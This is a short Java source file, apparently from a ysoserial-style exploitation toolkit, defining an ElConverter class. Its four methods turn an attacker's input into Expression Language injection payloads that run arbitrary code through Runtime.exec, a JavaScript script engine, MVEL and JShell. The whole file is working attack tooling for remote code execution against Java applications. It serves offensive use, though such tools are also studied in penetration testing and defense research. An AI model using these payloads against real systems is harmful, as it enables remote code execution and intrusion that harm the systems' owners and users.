package com.h2tg.ysogate.bullet.defineClass;

public class ElConverter
{
    public static String el2js(String js)
    {
        String code = "''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\""+js+"\")";
        return code;
    }
    public static String el2cmd(String cmd)
    {
        String code = "''.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\""+cmd+"\")";
        return code;
    }
    public static String el2mvel(String mvel)
    {
        String code = "''.getClass().forName(\"org.mvel2.MVEL\").parseExpression(\""+mvel+"\").getValue(null)";
        return code;
    }
    public static String el2jshell(String code)
    {
        String payload = "\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"eval\",\"\".getClass()).invoke(\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null),\""+code+"\")";
        return payload;
    }
}
